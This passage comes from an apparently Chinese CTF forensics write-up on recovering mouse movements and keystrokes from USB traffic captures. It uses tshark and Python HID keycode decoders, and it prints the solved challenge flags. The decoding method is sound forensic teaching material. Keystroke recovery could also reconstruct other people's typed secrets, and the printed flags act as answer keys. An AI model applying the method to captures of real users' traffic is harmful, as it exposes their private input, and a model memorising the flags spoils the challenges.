<span class="hljs-number">127</span> :<br>        y -= <span class="hljs-number">256</span><br>    posx += x<br>    posy += y<br>    btn_flag = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)  <span class="hljs-comment"># 1 for left , 2 for right , 0 for nothing</span><br>    <span class="hljs-keyword">if</span> btn_flag == <span class="hljs-number">2</span> : <span class="hljs-comment"># 1 代表左键</span><br>        f.write(<span class="hljs-built_in">str</span>(posx))<br>        f.write(<span class="hljs-string">&#x27; &#x27;</span>)<br>        f.write(<span class="hljs-built_in">str</span>(posy))<br>        f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>f.close()<br></code></pre></td></tr></table></figure><p>经过测试是鼠标右键流量，在生成的xy.txt中可以得到坐标：<br><img src="https://img-blog.csdnimg.cn/20210412192227460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>看了<a href="https://blog.csdn.net/qq_45555226/article/details/102810474">大师傅的wp</a>，发现我们添加冒号得到的内容不一样</p><p><img src="https://img-blog.csdnimg.cn/20210412162949750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>大师傅直接提取鼠标流量，含有冒号，而我提取出来的不含冒号，是Wireshark版本不同的缘故，在网上找到老版本的Wireshark</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Wireshark-win64-2.4.3<br>https://pan.baidu.com/s/1nvIIKpr<br>密码：5uao<br></code></pre></td></tr></table></figure><p>提取流量得到usbdata.txt,包含冒号：<img src="https://img-blog.csdnimg.cn/20210412163509262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接使用上面的mouse.py脚本，即可得到xy.txt。<br><img src="https://img-blog.csdnimg.cn/20210412164602929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入gnuplot工具，把xy.txt文本里的坐标转化为图片<br><img src="https://img-blog.csdnimg.cn/20210412165000484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>翻转一下图片<br><img src="https://img-blog.csdnimg.cn/20210412165426744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">XNCA&#123;U2BPCAPCETEVERYTHING&#125;<br></code></pre></td></tr></table></figure><p>也可以利用python脚本画图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>x, y = np.loadtxt(<span class="hljs-string">&#x27;xy.txt&#x27;</span>, delimiter=<span class="hljs-string">&#x27; &#x27;</span>, unpack=<span class="hljs-literal">True</span>)<br>plt.plot(x, y, <span class="hljs-string">&#x27;.&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p>得到<br><img src="https://img-blog.csdnimg.cn/20210412200559583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h2><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3><p>USB协议数据部分在Leftover Capture Data域中，数据长度为八个字节。</p><p>击键信息集中在第3个字节，每次击键都会产生一个数据包。</p><p><a href="https://max.book118.com/html/2017/0407/99227972.shtm">参考文档</a>：USB keyboard映射表<br><img src="https://img-blog.csdnimg.cn/20210405115902138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="实战练习-1"><a href="#实战练习-1" class="headerlink" title="实战练习"></a>实战练习</h3><p>flag信息一般隐藏在USB流量中，通过USB协议数据中的键盘键码转换成键位。</p><p><strong>题目1：</strong><br>分析流量包，发现数据是16位，所以是USB键盘流量<br><img src="https://img-blog.csdnimg.cn/20210404201547272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>tshark提取USB流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata &gt; usbdata.txt <br></code></pre></td></tr></table></figure><p>usbdata.txt文件内容<br><img src="https://img-blog.csdnimg.cn/2021040418495794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现提取出来包含空行，使用命令剔除空行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>查看usbdata.txt空余行消失<br><img src="https://img-blog.csdnimg.cn/20210404185033903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提取出来的数据可能会带冒号，也可能不带，但是一般的脚本都会按照有冒号的数据来识别。有冒号时提取数据的<code>[6:8]</code>，无冒号时数据在<code>[4:6]</code></p><p>可以利用脚本加上冒号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)==<span class="hljs-number">16</span>: <span class="hljs-comment"># 键盘流量len=16，鼠标流量len=8</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>                <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>fi.close()<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404185301518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在网上找到两个键盘流量脚本</p><p>keyboard1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">mappings = &#123; <span class="hljs-number">0x04</span>:<span class="hljs-string">&quot;A&quot;</span>,  <span class="hljs-number">0x05</span>:<span class="hljs-string">&quot;B&quot;</span>,  <span class="hljs-number">0x06</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x07</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x08</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-number">0x09</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-number">0x0A</span>:<span class="hljs-string">&quot;G&quot;</span>,  <span class="hljs-number">0x0B</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-number">0x0C</span>:<span class="hljs-string">&quot;I&quot;</span>,  <span class="hljs-number">0x0D</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-number">0x0E</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-number">0x0F</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-number">0x10</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-number">0x11</span>:<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-number">0x12</span>:<span class="hljs-string">&quot;O&quot;</span>,  <span class="hljs-number">0x13</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0x14</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-number">0x15</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-number">0x16</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-number">0x17</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-number">0x18</span>:<span class="hljs-string">&quot;U&quot;</span>,<span class="hljs-number">0x19</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-number">0x1A</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-number">0x1B</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-number">0x1C</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-number">0x1D</span>:<span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-number">0x1E</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">0x1F</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-number">0x20</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-number">0x21</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-number">0x22</span>:<span class="hljs-string">&quot;5&quot;</span>,  <span class="hljs-number">0x23</span>:<span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-number">0x24</span>:<span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-number">0x25</span>:<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-number">0x26</span>:<span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-number">0x27</span>:<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-number">0x28</span>:<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-number">0x2a</span>:<span class="hljs-string">&quot;[DEL]&quot;</span>,  <span class="hljs-number">0X2B</span>:<span class="hljs-string">&quot;    &quot;</span>, <span class="hljs-number">0x2C</span>:<span class="hljs-string">&quot; &quot;</span>,  <span class="hljs-number">0x2D</span>:<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-number">0x2E</span>:<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">0x2F</span>:<span class="hljs-string">&quot;[&quot;</span>,  <span class="hljs-number">0x30</span>:<span class="hljs-string">&quot;]&quot;</span>,  <span class="hljs-number">0x31</span>:<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-number">0x32</span>:<span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-number">0x33</span>:<span class="hljs-string">&quot;;&quot;</span>,  <span class="hljs-number">0x34</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">0x36</span>:<span class="hljs-string">&quot;,&quot;</span>,  <span class="hljs-number">0x37</span>:<span class="hljs-string">&quot;.&quot;</span> &#125;<br><br>nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span>:<br>         <span class="hljs-keyword">continue</span><br>    nums.append(<span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>))<br><br>keys.close()<br><br>output = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> nums:<br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> :<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> n <span class="hljs-keyword">in</span> mappings:<br>        output += mappings[n]<br>    <span class="hljs-keyword">else</span>:<br>        output += <span class="hljs-string">&#x27;[unknown]&#x27;</span><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;output :\n&#x27;</span> + output<br></code></pre></td></tr></table></figure><p>运行脚本得到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/Python/USB]<br>└─$ python keyboard.py                 <br>output :<br>666C61677B3866396564326639333365662[DEL]31346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>因为[DEL]是删除键，所以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">666C61677B38663965643266393333656631346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>keyboard2.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<br>    <span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>,<br>    <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>,<br>     <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>,<br>      <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>,<br>       <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>,<br>        <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>,<br>         <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<br>         <span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<br>         <span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<br>         <span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<br>         <span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<br>         <span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<br>         <span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>shiftKeys = &#123;<br>    <span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>,<br>     <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>,<br>      <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>,<br>       <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>,<br>        <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>,<br>         <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>,<br>          <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<br>          <span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span 